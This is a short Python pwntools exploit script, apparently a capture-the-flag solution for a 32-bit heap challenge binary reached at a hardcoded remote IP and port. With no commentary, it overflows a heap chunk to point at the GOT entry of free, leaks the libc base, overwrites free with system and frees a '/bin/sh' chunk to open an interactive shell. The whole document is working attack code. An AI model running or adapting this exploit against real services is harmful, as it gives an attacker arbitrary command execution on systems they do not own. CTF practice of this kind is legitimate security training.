from pwn import*
def add(size,length,text):
	p.sendlineafter('Action: ','0')
	p.sendlineafter('description: ',str(size))
	p.sendlineafter('name: ','FMYY')
	p.sendlineafter("length: ", str(length))
	p.sendlineafter('text: ',text)
def free(index):
	p.sendlineafter('Action: ','1')
	p.sendlineafter('index: ',str(index))
def show(index):
	p.sendlineafter('Action: ','2')
	p.sendlineafter('index: ',str(index))
def edit(index,length,text):
	p.sendlineafter('Action: ','3')
	p.sendlineafter('index: ',str(index))
	p.sendlineafter('length: ',str(length))
	p.sendlineafter('text: ',text)
p = process('./main')
elf = ELF('./main')
p = remote('111.198.29.45',54841)
#context.log_level ='debug'
add(0x80,0x80,'FMYY')
add(0x80,0x80,'FMYY')
add(0x8,0x8,'/bin/sh\x00')
free(0)
add(0x100,0x80+0x88+0x88+0xC,'\x00'*0x198+p32(elf.got['free']))
show(1)
p.recvuntil('description: ')
libc_base = u32(p.recv(4)) - 0x070750
log.info('Libc_Base:\t' + hex(libc_base))
system = libc_base + 0x03A940
edit(1,4,p32(system))
free(2)
p.interactive()
